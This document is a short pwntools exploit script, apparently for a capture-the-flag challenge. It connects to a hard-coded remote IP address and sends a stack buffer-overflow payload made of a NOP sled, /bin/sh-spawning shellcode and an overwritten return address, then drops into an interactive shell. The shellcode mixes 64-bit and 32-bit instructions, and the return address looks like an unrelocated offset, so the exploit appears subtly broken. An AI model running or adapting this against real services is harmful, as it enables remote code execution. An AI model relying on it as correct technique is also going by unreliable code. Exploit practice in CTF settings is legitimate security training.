from pwn import *

# Set context for the binary
context.binary = './chall'

# Start the process (or connect to remote)
#p = process('./chall')  # Use remote('address', port) for remote targets
p = remote('178.128.218.40', 2001)
# Create the payload
# Replace this with your actual shellcode
shellcode = b"\x48\x31\xc0\x50\x48\x89\xe7\x50\x68\x2f\x2f\x73\x68" \
            b"\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x3b" \
            b"\xcd\x80"

# Create a NOP sled
nop_sled = b"\x90" * (256 - len(shellcode) - 8)  # Adjust for total buffer size
ret_address = p64(0x1159)  # Address of `chall` (adjust as needed)

# Construct the full payload
payload = nop_sled + shellcode + b"A" * (8) + ret_address

# Send the payload
p.sendline(payload)

# Interact with the shell (if it gets executed)
p.interactive()
